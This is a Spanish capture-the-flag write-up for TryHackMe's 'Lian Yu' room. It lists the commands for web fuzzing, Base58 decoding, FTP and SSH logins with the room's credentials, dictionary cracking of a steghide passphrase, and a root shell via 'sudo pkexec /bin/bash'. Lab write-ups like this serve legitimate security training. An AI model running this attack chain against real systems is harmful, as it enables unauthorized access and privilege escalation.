@@ -1,0 +1,301 @@
+---
+title: 'Lian Yu'
+description: 'Enumeración web, decodificación Base58, FTP y esteganografía anidada (passphrase + ZIP), con escalada de privilegios mediante pkexec.'
+publishDate: 2026-09-03
+tags:
+  - cybersecurity
+  - tryhackme
+  - privesc
+---
+
+**Dificultad:** Easy **Categoría:** Enumeración web, decodificación Base58, FTP, esteganografía (cracking de passphrase + archivo ZIP anidado), escalada de privilegios vía `pkexec` (sudoers mal configurado) **Sala:** [https://tryhackme.com/room/lianyu](https://tryhackme.com/room/lianyu)
+
+## Descripción de la sala
+
+Máquina con temática de la serie _Arrow_ (el nombre «Lian Yu» es la isla ficticia de la serie), que combina fuzzing web en múltiples niveles, decodificación de una codificación poco común (**Base58**, la misma usada en direcciones de criptomonedas como Bitcoin), acceso FTP, esteganografía con una capa adicional de archivo ZIP anidado dentro de la imagen, y una escalada de privilegios sobre `pkexec` mediante un permiso `sudo` mal configurado.
+
+> **Nota sobre placeholders:** se usa `{IP}` / `target` para representar la IP asignada por TryHackMe (cambia en cada despliegue). El resto de valores (usuarios, contraseñas, rutas, hashes) son fijos en esta máquina.
+
+---
+
+## 1. Escaneo de puertos (paso previo no incluido explícitamente en estos apuntes)
+
+```bash
+nmap -sC -sV -p- target -oN nmap_full.txt
+```
+
+**Puertos esperados:**
+
+| Puerto | Servicio     |
+| ------ | ------------ |
+| 21/tcp | FTP (vsftpd) |
+| 22/tcp | SSH          |
+| 80/tcp | HTTP         |
+
+---
+
+## 2. Enumeración web — primer nivel
+
+```bash
+gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak -t 30
+```
+
+- `-x php,html,txt,bak`: prueba estas extensiones además de nombres de directorio.
+- `-t 30`: 30 hilos concurrentes.
+
+**Resultado relevante:**
+
+```
+/island/ (Status: 301)
+```
+
+Al visitar `http://target/island/`, la página muestra un mensaje temático que menciona la palabra clave **«vigilante»** (referencia directa al alias del personaje principal de la serie _Arrow_, Oliver Queen) — esta palabra resultará ser, más adelante, el **nombre de usuario** para el acceso FTP.
+
+---
+
+## 3. Enumeración web — segundo nivel
+
+```bash
+gobuster dir -u http://target/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+**Resultado relevante:**
+
+```
+/island/2100/ (Status: 301)
+```
+
+### 3.1 Búsqueda de archivos con extensión específica dentro de `/island/2100/`
+
+Dentro de este subdirectorio, un fuzzing adicional especificando la extensión `.ticket` revela un archivo:
+
+```bash
+gobuster dir -u http://target/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
+```
+
+```
+/green_arrow.ticket (Status: 200)
+```
+
+Al abrir ese archivo (`http://target/island/2100/green_arrow.ticket`), se obtiene una cadena de texto ofuscada:
+
+```
+RTy8yhBQdscX
+```
+
+### 3.2 Decodificación en Base58
+
+Esta cadena no corresponde a Base64 ni a ninguna codificación «clásica» reconocible a simple vista. Probando distintos esquemas (por ejemplo, en [CyberChef](https://gchq.github.io/CyberChef/) o en un decodificador online como [browserling.com/tools/base58-decode](https://www.browserling.com/tools/base58-decode)), se identifica que está codificada en **Base58** — el mismo esquema de codificación usado en direcciones de Bitcoin, diseñado para evitar caracteres visualmente ambiguos (no incluye `0`, `O`, `I`, `l`, ni caracteres especiales como `+` o `/`, a diferencia de Base64).
+
+```bash
+python3 -c "
+import base58
+print(base58.b58decode('RTy8yhBQdscX').decode())
+"
+```
+
+**Resultado (contraseña):**
+
+```
+!#th3h00d
+```
+
+---
+
+## 4. Credenciales FTP
+
+Combinando el nombre de usuario deducido en el paso 2 (`vigilante`) con la contraseña recién decodificada:
+
+```
+usuario: vigilante
+contraseña: !#th3h00d
+```
+
+```bash
+ftp target
+# Usuario: vigilante
+# Contraseña: !#th3h00d
+```
+
+Dentro de la sesión FTP:
+
+```
+ftp> ls -la
+```
+
+Se encuentran tres archivos de imagen:
+
+```
+Leave_me_alone.png
+Queen's_Gambit.png
+aa.jpg
+```
+
+```
+ftp> get Leave_me_alone.png
+ftp> get Queen's_Gambit.png
+ftp> get aa.jpg
+ftp> cd ..
+ftp> ls
+```
+
+Al retroceder un directorio (`cd ..`), se descubren los **directorios home de dos usuarios** del sistema: `slade` y `vigilante` — confirmando que `slade` es otro usuario válido a tener en cuenta más adelante (por ejemplo, para el acceso SSH final).
+
+> Nota: en algunas resoluciones de esta sala, `Leave_me_alone.png` resulta tener su cabecera (_magic bytes_) corrupta intencionalmente y requiere repararse con un editor hexadecimal (`hexedit`) para poder visualizarla correctamente — sin embargo, este archivo es un **señuelo/distracción** que no aporta al camino de explotación principal; el archivo realmente relevante es `aa.jpg`, como se confirma en el siguiente paso.
+
+---
+
+## 5. Extrayendo el contenido oculto de `aa.jpg`
+
+Al revisar `aa.jpg`, su extensión (`.jpg`, un formato compatible con esteganografía LSB) y su tamaño lo hacen candidato a contener datos ocultos con `steghide`:
+
+```bash
+steghide info aa.jpg
+```
+
+Steghide confirma que hay datos embebidos, pero protegidos por una **passphrase** desconocida. En vez de adivinarla manualmente, se usa **`stegcracker`**, una herramienta que automatiza el ataque de diccionario contra archivos protegidos con `steghide`:
+
+```bash
+stegcracker aa.jpg /usr/share/wordlists/rockyou.txt
+```
+
+- `stegcracker`: prueba automáticamente cada palabra del diccionario indicado como passphrase de `steghide`, deteniéndose al encontrar la correcta.
+
+Al completarse con éxito, `stegcracker` genera un archivo de salida:
+
+```bash
+file aa.jpg.out
+```
+
+`file` identifica que, pese a su nombre (`aa.jpg.out`), el contenido real de este archivo es un **archivo ZIP** — es decir, había un archivo comprimido oculto dentro de la imagen mediante esteganografía, y `stegcracker`/`steghide` ya lo extrajo, solo que conservó una extensión genérica.
+
+```bash
+mv aa.jpg.out aa.zip
+unzip aa.zip
+```
+
+Esto descomprime dos archivos:
+
+```
+passwd.txt
+shado
+```
+
+### 5.1 Revisando `passwd.txt`
+
+```bash
+cat passwd.txt
+```
+
+Contiene un mensaje temático a modo de «visado de entrada a Lian Yu», con una nota adicional indicando que las personas con «habilidades especiales» tienen acceso a algo llamado `shado` — una pista directa hacia el siguiente archivo.
+
+### 5.2 Revisando `shado`
+
+```bash
+cat shado
+```
+
+Este archivo contiene directamente una **contraseña**:
+
+```
+M3tahuman
+```
+
+---
+
+## 6. Credenciales SSH
+
+Combinando el usuario `slade` (descubierto al listar los directorios home vía FTP en el paso 4) con la contraseña recién obtenida:
+
+```
+usuario: slade
+contraseña: M3tahuman
+```
+
+```bash
+ssh slade@target
+# contraseña: M3tahuman
+```
+
+Al iniciar sesión, el propio banner de bienvenida (o el contenido de `user.txt` en el home de `slade`) suele contener la flag de usuario de esta sala.
+
+```bash
+cat /home/slade/user.txt
+```
+
+---
+
+## 7. Escalada de privilegios
+
+### 7.1 Enumeración de permisos sudo
+
+```bash
+sudo -l
+```
+
+Salida esperada:
+
+```
+User slade may run the following commands on lianyu:
+    (ALL) NOPASSWD: /usr/bin/pkexec
+```
+
+Esto indica que `slade` puede ejecutar **`pkexec`** como cualquier usuario (incluido root), **sin necesidad de contraseña**.
+
+### 7.2 ¿Qué es `pkexec`?
+
+`pkexec` es la utilidad de línea de comandos de **PolicyKit** (`polkit`), diseñada para permitir que usuarios autorizados ejecuten comandos con privilegios de otro usuario (normalmente root), de forma similar a `sudo` pero gestionado mediante políticas de PolicyKit en vez del archivo `/etc/sudoers`. Al recibir un permiso de `sudo` sin restricciones sobre `pkexec`, cualquier comando que se le pase como argumento se ejecutará con los privilegios que `pkexec` termine adoptando — en este caso, root.
+
+> **Nota de contexto:** `pkexec` también es conocido por una vulnerabilidad grave e independiente de este escenario, **CVE-2021-4034 («PwnKit»)**, que permite escalar a root **sin necesidad de ningún permiso de `sudo` previo**, explotando un fallo de manejo de argumentos en el propio binario SUID de `pkexec`. En esta máquina en particular, el vector es más simple: no es necesario explotar PwnKit, ya que el permiso de `sudo` sobre `pkexec` ya es, por sí mismo, suficiente para obtener una shell de root directamente.
+
+Esta técnica (abusar de un permiso `sudo` sin restricciones sobre `pkexec` para lanzar una shell) está documentada en **GTFOBins** ([https://gtfobins.github.io/gtfobins/pkexec/](https://gtfobins.github.io/gtfobins/pkexec/)).
+
+### 7.3 Explotación
+
+```bash
+sudo /usr/bin/pkexec /bin/bash
+```
+
+Al ejecutarse, `pkexec` lanza `/bin/bash` con privilegios de root:
+
+```bash
+id
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+### 7.4 Flag de root
+
+```bash
+cat /root/root.txt
+```
+
+---
+
+## 8. Resumen de la cadena de ataque
+
+1. **Reconocimiento** con `nmap` → FTP (21), SSH (22), HTTP (80).
+2. **Fuzzing web (primer nivel)** con `gobuster` → se descubre `/island/`, con la palabra clave `vigilante` (futuro usuario FTP).
+3. **Fuzzing web (segundo nivel)** → se descubre `/island/2100/`, y dentro de él, filtrando por extensión, el archivo `green_arrow.ticket`.
+4. **Decodificación Base58** de la cadena obtenida en el ticket → contraseña FTP `!#th3h00d`.
+5. **Acceso FTP** como `vigilante` → se descargan tres imágenes y se descubre el usuario adicional `slade` al retroceder un directorio.
+6. **Esteganografía**: `stegcracker` crackea la passphrase de `aa.jpg` contra `rockyou.txt`; el archivo extraído resulta ser un **ZIP** con dos archivos: `passwd.txt` (pista narrativa) y `shado` (contraseña en texto plano).
+7. **Acceso SSH** como `slade` con la contraseña `M3tahuman` → flag de usuario.
+8. **Enumeración de sudo** (`sudo -l`) → permiso sin restricciones sobre `/usr/bin/pkexec`.
+9. **Explotación vía GTFOBins** (`sudo pkexec /bin/bash`) → shell de root.
+10. **Flag de root** final.
+
+## 9. Lecciones aprendidas / conceptos clave
+
+- **Base58** es una codificación menos común que Base64, diseñada originalmente para direcciones de criptomonedas (evita caracteres ambiguos como `0`/`O`, `I`/`l`); reconocerla requiere experiencia previa o probar sistemáticamente varios esquemas de codificación cuando Base64/Base32/Hex no dan resultado.
+- **`stegcracker`** automatiza lo que de otro modo sería un proceso manual y tedioso de prueba de contraseñas contra `steghide`, siendo una herramienta imprescindible cuando se sospecha esteganografía pero no se tiene la passphrase.
+- **La esteganografía puede anidar otros formatos de archivo** (en este caso, un ZIP oculto dentro de un JPEG): siempre conviene verificar con `file` el tipo real de cualquier archivo extraído, independientemente de su nombre o extensión aparente.
+- **Enumerar directorios «hacia arriba» en FTP** (`cd ..`) puede revelar información valiosa (como nombres de usuario del sistema, visibles a través de los directorios home) que de otro modo pasaría desapercibida.
+- **`pkexec` con permisos `sudo` sin restricciones** es funcionalmente equivalente a dar acceso root completo, documentado en GTFOBins — pero además, `pkexec` tiene su propio historial de vulnerabilidades graves (PwnKit, CVE-2021-4034) que pueden explotarse incluso sin ningún permiso de `sudo` previo, lo que lo convierte en un binario especialmente sensible desde el punto de vista de la seguridad del sistema.
+
+## 10. Herramientas utilizadas
+
+`nmap`, `gobuster`, CyberChef / decodificador Base58, cliente `ftp`, `steghide`, `stegcracker`, `file`, `unzip`, cliente `ssh`, `sudo`, `pkexec` (abuso vía GTFOBins).
+
+---
+
+_Writeup con fines académicos, elaborada a partir de apuntes propios de la resolución de la máquina «Lian_Yu» en TryHackMe, complementada con writeups públicas de la comunidad para completar el reconocimiento inicial, el contexto del descubrimiento del usuario `slade` vía FTP, y la explicación de la técnica de escalada con `pkexec`._
